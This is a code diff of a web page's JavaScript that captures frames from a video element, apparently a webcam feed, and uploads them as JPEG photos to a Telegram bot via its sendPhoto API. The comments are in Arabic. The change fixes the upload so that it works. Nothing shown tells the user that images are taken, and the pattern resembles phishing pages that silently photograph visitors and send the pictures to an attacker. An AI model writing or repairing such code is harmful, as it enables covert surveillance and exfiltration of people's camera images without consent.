@@ -45,39 +45,25 @@
         ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
         canvas.toBlob(function (blob) {
-          const reader = new FileReader();
-          reader.onloadend = function () {
-            const base64 = reader.result.split(",")[1];
-            sendToTelegram(base64);
-          };
-          reader.readAsDataURL(blob);
+          sendToTelegram(blob);
         }, "image/jpeg");
       });
 
       videoElement.play();
     }
 
-    function sendToTelegram(base64Image) {
-      const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-      
+    function sendToTelegram(blob) {
       const formData = new FormData();
       formData.append("chat_id", chatId);
-      formData.append("photo", `data:image/jpeg;base64,${base64Image}`);
-      formData.append("caption", `📸 ${new Date().toLocaleString()}`);
+      formData.append("photo", blob);
 
-      fetch(url, {
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: "POST",
         body: formData
       })
         .then((response) => response.json())
-        .then((result) => {
-          if (result.ok) {
-            console.log("✅ تم إرسال الصورة");
-          } else {
-            console.error("❌ فشل إرسال الصورة:", result.description);
-          }
-        })
-        .catch((error) => console.error("❌ خطأ في الإرسال:", error));
+        .then((result) => console.log(result))
+        .catch((error) => console.error("❌ فشل الإرسال:", error));
     }
   </script>
 </body>
